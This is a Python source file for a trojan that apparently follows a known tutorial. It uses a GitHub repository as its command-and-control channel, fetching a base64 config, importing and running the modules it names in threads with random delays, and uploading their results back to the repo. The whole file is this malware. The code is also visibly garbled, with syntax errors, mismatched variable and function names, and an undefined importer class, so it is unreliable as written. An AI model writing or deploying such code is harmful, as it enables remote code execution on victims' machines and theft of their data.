import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id="dic"

trojan_config= "%s.json" % trojan_id
data_path    = "data/%s/" % trojan_id
trojan modules = []
configured = False
task_queue = Queue.Queue()

def connectToGithub():
    gh=login(username="username", password= "password")
    repo=gh.repository("AnthonyLaiuppa", "TrojanDemo")
    branch=repo.branch("master")
    return gh,repo,branch

def getFileContents(filepath):
    gh,repo,branch=connectToGithub():
    tree=branch.commit.commit.tree.recurse()
    
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob=repo.blob(filename._json_data['sha']
            return blob.content
    return None

def getTrojConf():
    global configured
    configJson=getFileContents(trojan_config)
    config=json.loads(base64.b64decode(config_json))
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module']
    return config

def storeModuleResult(data):    
    gh,repo,branch= connectToGithub()
    remotePath="data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return

def moduleRunner(module):
    task.queue.put(1)
    result=sys.modules[module].run()
    task_queue.get()
    #store result in our repo
    storeModuleResult(result)
    return

#main loop
sys.meta_path=[GitImporter()]

while True:
    if task_queue.empty():
        config=getTrojConfig()
    for task in config:
        t=threading.Thread(target=moduleRunner, args=(task['module'],))
        t.start()
        time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))
